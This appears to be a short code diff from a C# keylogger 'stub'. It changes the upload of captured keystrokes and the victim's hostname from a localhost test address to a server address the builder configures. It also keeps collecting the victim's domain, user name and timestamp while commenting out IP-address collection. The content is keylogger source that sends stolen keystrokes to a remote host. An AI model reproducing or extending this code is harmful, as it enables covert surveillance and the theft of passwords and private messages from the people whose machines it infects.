@@ -264,7 +264,7 @@ namespace stub
             try
             {
                 webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                webclient.UploadString("http://127.0.0.1/sendkeylog.php", "client=" + Dns.GetHostName() + "&keylog=" + GetKeystrokes());
+                webclient.UploadString("http://" + MutexHandler.appNameReturn() + "/sendkeylog.php", "client=" + Dns.GetHostName() + "&keylog=" + GetKeystrokes());
             }
             catch (Exception)
             {
@@ -286,11 +286,11 @@ namespace stub
 
             var host = Dns.GetHostEntry(Dns.GetHostName());
 
-            messageBody += "IP Addresses:" + newLine;
-            foreach (var address in host.AddressList)
-            {
-                messageBody += address + newLine;
-            }
+            //messageBody += "IP Addresses:" + newLine;
+            //foreach (var address in host.AddressList)
+            //{
+            //    messageBody += address + newLine;
+            //}
 
             messageBody += newLine + "User: " + Environment.UserDomainName + "\\" + Environment.UserName + "\r\n";
             messageBody += "Time: " + now.ToString() + newLine;
